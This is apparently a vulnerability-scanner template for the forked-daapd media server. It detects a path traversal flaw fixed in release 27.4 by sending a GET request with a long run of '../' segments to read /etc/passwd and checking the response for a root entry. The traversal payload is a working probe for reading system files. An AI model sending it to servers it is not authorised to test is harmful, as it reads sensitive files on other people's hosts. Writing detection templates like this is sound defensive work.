http:
- matchers:
  - part: body
    regex:
    - root:.*:0:0
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/../../../../../../../../../../../../../etc/passwd'
id: forked-daapd-path-traversal
info:
  author: Steve Mason
  classification:
    cwe-id: CWE-35
  description: Sends a GET request for /etc/passed to identify path traversal vulnerability
    in forked-daapd patched in release 27.4
  metadata:
    max-requests: 1
  name: forked-daapd path traversal
  reference: https://github.com/owntone/owntone-server/releases/tag/27.4
  severity: high
  tags: forked-daapd
